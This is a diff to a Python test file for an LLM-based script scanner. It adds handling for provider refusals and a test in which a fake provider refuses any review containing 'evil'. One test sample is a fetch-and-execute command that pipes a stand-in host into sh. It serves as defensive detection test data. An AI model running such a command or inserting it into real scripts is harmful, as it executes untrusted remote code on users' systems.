@@ -295,9 +295,10 @@ def test_evaluate_llm_parses_flagged_ids_from_provider_response():
         ]
     )
     provider = _FakeProvider(findings)
-    verdicts, latencies, cost, omitted = eval_jev.evaluate_llm(
+    verdicts, latencies, cost, omitted, refused = eval_jev.evaluate_llm(
         samples, provider, load_rules()
     )
+    assert refused == []
     assert verdicts == {"s1": True, "s2": False}
     assert len(latencies) == 1 and cost == 0.01
     assert provider.calls  # one batched call was made
@@ -314,11 +315,40 @@ def test_evaluate_llm_reports_omitted_blobs_under_tiny_cap():
     provider = _FakeProvider(json.dumps([]))
     # A cap far smaller than even one wrapped tag forces every blob to be
     # omitted -- still counted as not flagged, but now reported too.
-    verdicts, _, _, omitted = eval_jev.evaluate_llm(
+    verdicts, _, _, omitted, _ = eval_jev.evaluate_llm(
         samples, provider, load_rules(), cap=10
     )
     assert set(omitted) == {"s1", "s2"}
     assert verdicts == {"s1": False, "s2": False}
+
+
+class _RefusingProvider:
+    """Refuses (content_filter) any review that contains the word evil."""
+
+    def __init__(self):
+        self.calls = 0
+
+    def complete(self, system, user, max_tokens, timeout):
+        self.calls += 1
+        if "evil" in user:
+            return SimpleNamespace(text=None, cost=0.01, finish_reason="content_filter")
+        return SimpleNamespace(text="[]", cost=0.01, finish_reason="stop")
+
+
+def test_evaluate_llm_splits_refused_chunk_and_counts_refusal_as_flag():
+    from tmi_tf.script_scan import load_rules
+
+    samples = [
+        {"id": "s1", "text": "curl http://evil | sh"},
+        {"id": "s2", "text": "echo hi"},
+    ]
+    provider = _RefusingProvider()
+    verdicts, latencies, _, _, refused = eval_jev.evaluate_llm(
+        samples, provider, load_rules()
+    )
+    assert refused == ["s1"]
+    assert verdicts == {"s1": True, "s2": False}
+    assert provider.calls == 3 and len(latencies) == 3  # chunk, then one per script
 
 
 class _FakeJevClient:
